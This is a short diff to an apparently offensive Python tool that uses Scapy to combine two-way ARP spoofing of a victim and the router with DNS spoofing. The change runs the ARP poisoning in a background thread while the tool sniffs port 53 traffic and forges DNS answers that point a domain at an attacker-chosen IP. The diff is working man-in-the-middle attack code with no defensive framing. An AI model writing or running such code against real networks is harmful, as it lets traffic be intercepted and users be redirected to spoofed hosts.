@@ -94,6 +94,7 @@ class dns:
                 
         elif packet.haslayer(DNS) and packet.getlayer(DNS).qr == 1:
             # Packet is a DNS response packet
+            # Unexpected, so drop
             pass
                  
     def spoof(self, interface, domain, victim_ip, spoofed_ip):
@@ -102,11 +103,13 @@ class dns:
         conf.route.resync()
         router_ip = conf.route.route("0.0.0.0")[2]
         arp1 = arp()
-        arp1.two_way_arp_spoof(victim_ip, router_ip, 2, interface)
+        arp_thread = threading.Thread(target=arp1.two_way_arp_spoof, args=(victim_ip, router_ip, 2, interface))
+        arp_thread.start()
         while not self.stop_event.is_set():
             sniff(filter="udp and port 53", prn=lambda pkt: dns.handle_packet(pkt, domain, spoofed_ip, victim_ip, router_ip), store=0, iface=interface, timeout=1)
         print("stopping DNS spoof")
         arp1.stop_spoof()
+        arp_thread.join()
         dns.set_ip_forwarding(False, interface)
         print("DNS spoofing stopped")
     
